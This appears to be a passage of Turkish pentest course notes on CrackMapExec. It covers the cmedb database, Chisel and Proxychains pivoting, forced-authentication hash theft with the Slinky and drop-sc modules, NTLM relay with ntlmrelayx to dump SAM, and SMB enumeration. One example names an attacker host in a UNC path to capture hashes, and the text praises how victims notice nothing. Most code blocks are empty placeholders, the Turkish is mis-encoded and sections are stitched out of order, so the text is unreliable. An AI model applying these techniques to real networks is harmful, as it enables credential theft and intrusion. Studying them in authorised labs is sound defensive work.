CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus

```

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

